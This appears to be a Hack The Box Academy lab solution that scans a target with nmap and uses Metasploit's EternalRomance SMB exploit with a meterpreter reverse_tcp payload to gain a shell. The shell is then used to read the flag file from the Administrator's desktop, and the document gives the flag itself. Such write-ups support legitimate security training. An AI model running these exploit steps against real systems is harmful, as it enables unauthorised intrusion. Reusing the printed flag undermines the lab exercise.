# https://academy.hackthebox.com/module/39/section/404

# Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.
# 10.129.2.141

nmap -sV <TARGET_IP>
nmap -sV 10.129.2.141

# Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-21 20:02 BST
# Nmap scan report for 10.129.2.141
# Host is up (0.073s latency).
# Not shown: 996 closed tcp ports (conn-refused)
# PORT    STATE SERVICE      VERSION
# 80/tcp  open  http         Microsoft IIS httpd 10.0
# 135/tcp open  msrpc        Microsoft Windows RPC
# 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
# 445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
# Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds

msfconsole -q
search eternalromance
search eternalromance type:exploit port:445 platform:windows
use 0
options
set RHOSTS 10.129.2.141 # OR setg RHOSTS 10.129.2.141
# set payload windows/meterpreter/reverse_tcp
set payload 2
set LPORT 4444
run

cd /
cd Users
cd Administrator
cd Desktop
more flag.txt
HTB{MSF-W1nD0w5-3xPL01t4t10n}
